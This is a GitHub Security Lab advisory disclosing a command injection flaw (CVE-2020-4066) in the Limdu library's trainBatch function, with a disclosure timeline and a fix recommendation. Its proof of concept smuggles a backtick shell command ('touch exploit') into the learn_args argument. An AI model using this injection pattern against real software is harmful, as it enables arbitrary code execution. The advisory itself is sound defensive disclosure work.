<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">September 24, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-113: Command injection vulnerability in limdu - CVE-2020-4066</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/kevinbackhouse">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/4358136?s=35" height="35" width="35">
        <span>Kevin Backhouse</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>The <code class="language-plaintext highlighter-rouge">trainBatch</code> function has a command injection vulnerability. Clients of the Limdu library are unlikely to be aware of this, so they might unwittingly write code that contains a vulnerability.</p>

<h2 id="product">Product</h2>
<p>Limdu</p>

<h2 id="tested-version">Tested Version</h2>
<p>Commit <a href="https://github.com/erelsgl/limdu/tree/87f8647c5a62eb16cb0f85aa55e88471ba2c2321/">87f8647</a></p>

<h2 id="details">Details</h2>

<h3 id="issue-1-command-injection-in-trainbatch">Issue 1: Command injection in <code class="language-plaintext highlighter-rouge">trainBatch</code></h3>

<p>The following proof-of-concept illustrates the vulnerability. First install Limdu:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm install limdu
</code></pre></div></div>

<p>Now create a fake binary and put it on the path:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir tmp
ln -s `which echo` tmp/liblinear_train
PATH=`pwd`/tmp/:$PATH
</code></pre></div></div>

<p>Now create a Javascript file with the following code:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">limdu</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">limdu</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">var</span> <span class="nx">classifier</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">limdu</span><span class="p">.</span><span class="nx">classifiers</span><span class="p">.</span><span class="nx">EnhancedClassifier</span><span class="p">({</span>
	<span class="na">classifierType</span><span class="p">:</span> <span class="nx">limdu</span><span class="p">.</span><span class="nx">classifiers</span><span class="p">.</span><span class="nx">multilabel</span><span class="p">.</span><span class="nx">BinaryRelevance</span><span class="p">.</span><span class="nx">bind</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">{</span>
		<span class="na">binaryClassifierType</span><span class="p">:</span> <span class="nx">limdu</span><span class="p">.</span><span class="nx">classifiers</span><span class="p">.</span><span class="nx">SvmLinear</span><span class="p">.</span><span class="nx">bind</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> 	<span class="p">{</span>
			<span class="na">learn_args</span><span class="p">:</span> <span class="dl">"</span><span class="s2">-c 20.0 `touch exploit`</span><span class="dl">"</span> 
		<span class="p">})</span>
	<span class="p">}),</span>
	<span class="na">featureExtractor</span><span class="p">:</span> <span class="nx">limdu</span><span class="p">.</span><span class="nx">features</span><span class="p">.</span><span class="nx">NGramsOfWords</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
	<span class="na">featureLookupTable</span><span class="p">:</span> <span class="k">new</span> <span class="nx">limdu</span><span class="p">.</span><span class="nx">features</span><span class="p">.</span><span class="nx">FeatureLookupTable</span><span class="p">()</span>
<span class="p">});</span>

<span class="nx">classifier</span><span class="p">.</span><span class="nx">trainBatch</span><span class="p">([</span>
	<span class="p">{</span><span class="na">input</span><span class="p">:</span> <span class="dl">"</span><span class="s2">I want an apple</span><span class="dl">"</span><span class="p">,</span> <span class="na">output</span><span class="p">:</span> <span class="dl">"</span><span class="s2">apl</span><span class="dl">"</span><span class="p">},</span>
	<span class="p">{</span><span class="na">input</span><span class="p">:</span> <span class="dl">"</span><span class="s2">I want a banana</span><span class="dl">"</span><span class="p">,</span> <span class="na">output</span><span class="p">:</span> <span class="dl">"</span><span class="s2">bnn</span><span class="dl">"</span><span class="p">}</span>
	<span class="p">]);</span>
</code></pre></div></div>

<p>and run it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node test.js
</code></pre></div></div>

<p>Notice that a file named <code class="language-plaintext highlighter-rouge">exploit</code> has been created.</p>

<p>This vulnerability is similar to command injection vulnerabilities that have been found in other Javascript libraries. Here are some examples:
<a href="https://github.com/advisories/GHSA-m8xj-5v73-3hh8">CVE-2020-7646</a>,
<a href="https://github.com/advisories/GHSA-426h-24vj-qwxf">CVE-2020-7614</a>,
<a href="https://github.com/advisories/GHSA-5q88-cjfq-g2mh">CVE-2020-7597</a>,
<a href="https://github.com/advisories/GHSA-4gp3-p7ph-x2jr">CVE-2019-10778</a>,
<a href="https://github.com/advisories/GHSA-84cm-v6jp-gjmr">CVE-2019-10776</a>,
<a href="https://github.com/advisories/GHSA-9jm3-5835-537m">CVE-2018-16462</a>,
<a href="https://github.com/advisories/GHSA-7g2w-6r25-2j7p">CVE-2018-16461</a>,
<a href="https://github.com/advisories/GHSA-cfhg-9x44-78h2">CVE-2018-16460</a>,
<a href="https://github.com/advisories/GHSA-pp57-mqmh-44h7">CVE-2018-13797</a>,
<a href="https://github.com/advisories/GHSA-c9j3-wqph-5xx9">CVE-2018-3786</a>,
<a href="https://github.com/advisories/GHSA-wjr4-2jgw-hmv8">CVE-2018-3772</a>,
<a href="https://github.com/advisories/GHSA-3pxp-6963-46r9">CVE-2018-3746</a>,
<a href="https://github.com/advisories/GHSA-jcw8-r9xm-32c6">CVE-2017-16100</a>,
<a href="https://github.com/advisories/GHSA-qh2h-chj9-jffq">CVE-2017-16042</a>.</p>

<p>We have written a <a href="https://codeql.com">CodeQL</a> query, which automatically detects this vulnerability. You can see the results of the query on the <code class="language-plaintext highlighter-rouge">Limdu</code> project <a href="https://lgtm.com/query/6307539653130472193/">here</a>.</p>

<h4 id="impact">Impact</h4>

<p>This issue may lead to remote code execution if a client of the library calls the vulnerable method with untrusted input.</p>

<h4 id="remediation">Remediation</h4>

<p>We recommend not using an API that can interpret a string as a shell command. For example, use <a href="https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback"><code class="language-plaintext highlighter-rouge">child_process.execFile</code></a> instead of <a href="https://nodejs.org/api/child_process.html#child_process_child_process_exec_command_options_callback"><code class="language-plaintext highlighter-rouge">child_process.exec</code></a>.</p>

<h2 id="cve">CVE</h2>
<p>CVE-2020-4066</p>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2020-05-19: Emailed report to erelsgl@gmail.com</li>
  <li>2020-05-19: <a href="https://github.com/erelsgl/limdu/commit/b1662138e4a1cd951e69941aa8712c12c8b7e3be">fix</a></li>
  <li>2020-06-15: <a href="https://github.com/erelsgl/limdu/security/advisories/GHSA-77qv-gh6f-pgh4">Advisory</a> published.</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GitHub Engineer <a href="https://github.com/erik-krogh">@erik-krogh (Erik Krogh Kristensen)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include <code class="language-plaintext highlighter-rouge">GHSL-2020-113</code> in any communication regarding this issue.</p>

    